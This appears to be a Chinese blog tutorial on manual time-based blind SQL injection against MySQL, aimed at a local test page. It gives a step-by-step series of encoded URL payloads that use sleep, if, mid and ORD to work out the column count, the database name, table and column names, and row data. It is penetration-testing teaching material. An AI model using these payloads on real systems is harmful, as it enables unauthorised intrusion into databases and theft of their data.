---
title: Mysql手工盲注(延时注入)
date: 2018-05-13 11:19:25
tags:
	- Mysql
	- 渗透测试
	- sql注入
	- hack
	- 盲注
categories: 渗透
---

![](http://p3ek8hcdl.bkt.clouddn.com/image/SQLinject.jpg)<!-- more -->
# Mysql手工盲注(延时注入)

盲注的核心是靠 if 判断来注入
```
length(xxxxx) 函数是统计字符串的长度

mid(str,1,3) 字符串截取

ORD() 转换成ascii码

if (条件,True,False);

sleep(n)

```
### 判断是否存在注入
```
http://127.0.0.1/sql.php?id=1
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/f3cc1490325163.jpg)
```
http://127.0.0.1/sql.php?id=1%20or%20sleep(2)
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/15601490325259.jpg)

### 暴当前的表有多少个字段：
```

http://127.0.0.1/sql.php?id=1%20union%20select%20sleep(2)        #请求时间不到一秒 说明不是1个字段

http://127.0.0.1/sql.php?id=1%20union%20select%201,sleep(2)        #请求时间不到一秒 说明不是2个字段

http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(2)        #请求时间是2秒 说明是3个字段
```

### 获取数据库名长度：
```
http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20length(database())=1),5,0))   #请求时间不到五秒 说明数据库名长度不是1

一位一位试，中间过程省略
http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20length(database())=5),5,0))   #请求时间是五秒 说明数据库名长度是5
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/799b1490326149.jpg)

### 获取数据库名：
```
http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),1,1)=%22a%22),5,0))     #请求时间不到五秒 说明数据库名第一位不是a

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),1,1)=%22b%22),5,0))      #请求时间不到五秒 说明数据库名第一位不是b

以此类推。。。。

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),1,1)=%22s%22),5,0))        #请求时间是五秒 说明数据库名第一位是s

然后慢慢猜解到第5位

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),2,1)=%22q%22),5,0))        #请求时间是五秒 说明数据库名第二位是q

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),3,1)=%22l%22),5,0))        #请求时间是五秒 说明数据库名第三位是l

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),4,1)=%22i%22),5,0))        #请求时间是五秒 说明数据库名第四位是i

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((select%20mid(database(),5,1)=%22n%22),5,0))        #请求时间是五秒 说明数据库名第五位是n

这样就获取到数据库名是sqlin
```

```
当然了 这方法注入比较慢 比如有些数据库是特殊符号呢？那怎么办？一个一个符号猜解吗？
采用ORD函数进行ascii码来判断会快点

比如：

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((ORD((select%20mid(database(),1,1)))%3C120),5,0))   #小于120请求时间是五秒

http://127.0.0.1/sql.php?id=1%20and%20sleep(if((ORD((select%20mid(database(),1,1)))%3C110),5,0))   #小于110请求时间不是五秒

说明数据库名第一位的ascii码值在110~120之间   
http://127.0.0.1/sql.php?id=1%20and%20sleep(if((ORD((select%20mid(database(),1,1)))=115),5,0))        #等于115请求时间是五秒
```
![](http://p3ek8hcdl.bkt.clouddn.com/image/d0091490327618.jpg)
115对应的是s   跟我们获取到的sqlin一样
其他四位也是一样的方法

### 获取表名长度：
```
http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(length(table_name)=4,5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名长度是4
```

### 获取表名：
```
http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,1,1)=%22n%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是n

http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,2,1)=%22e%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是e

http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,3,1)=%22w%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是w

http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if((mid(table_name,4,1)=%22s%22),5,0))%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1         #请求时间是五秒 说明表名第一位是s
```

### 获取表中的第一个字段长度：
```
http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(length(column_name)=2,5,0))%20from%20information_schema.columns%20where%20table_name=0x6E657773%20limit%200,1             #请求时间是五秒 说明表名第一个字段长度是2
```

### 获取表中的第一个字段名：
```
http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(mid(column_name,1,1)=%22i%22,5,0))%20from%20information_schema.columns%20where%20table_name=0x6E657773%20limit%200,1            #请求时间是五秒 说明表名第一个字段名第一位是i

http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(mid(column_name,1,1)=%22d%22,5,0))%20from%20information_schema.columns%20where%20table_name=0x6E657773%20limit%200,1            #请求时间是五秒 说明表名第一个字段名第二位是d

得出表名第一个字段名是id
```
### 获取news表中id字段下的内容：
先猜内容长度

```
http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(length(id)=1,5,0))%20from%20news%20limit%200,1       #请求时间是五秒 说明内容长度是1

http://127.0.0.1/sql.php?id=1%20union%20select%201,2,sleep(if(mid(id,1,1)=%221%22,5,0))%20from%20news%20limit%200,1       #请求时间是五秒 说明内容也是1
```

![](http://p3ek8hcdl.bkt.clouddn.com/image/032b1490329624.jpg)


### 补充
```
上面的语句查询其他表时会受到前面数据的影响
两个表admin，news
后面limit 0,1判断的就是第一个表admin   也就是猜第一位必须是a才返回true     后面limit 1,1的时候   猜第一位a和n都会返回true  其他false
```
查询其他表推荐语句
```
http://127.0.0.1/sqlin/sqltest.php?id=1%20and%20if((length((select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1))=4),sleep(5),0)
感觉应该是查询语句和sleep执行顺序的问题
```
获取其他同理

有错误的地方欢迎指正，共同进步。